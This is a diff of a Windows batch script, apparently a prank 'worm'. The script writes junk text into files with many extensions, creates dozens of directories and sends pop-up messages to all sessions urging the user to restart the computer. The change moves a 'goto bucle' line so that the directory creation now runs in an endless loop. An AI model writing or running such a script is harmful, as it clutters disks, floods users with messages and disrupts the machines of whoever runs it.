@@ -26,8 +26,6 @@ echo HOLA>>%worm%.css
 echo HOLA>>%worm%.py
 echo HOLA>>%worm%.sh
 echo HOLA>>%worm%.vbs
-goto bucle
-cls 
 mkdir lol
 mkdir a
 mkdir b
@@ -104,6 +102,7 @@ mkdir 47
 mkdir 48
 mkdir 49
 mkdir 50
+goto bucle
 msg * holaaaaaaaaaaaaaa :)
 msg * quieres jugar?
 msg * solo reinicia la computadora
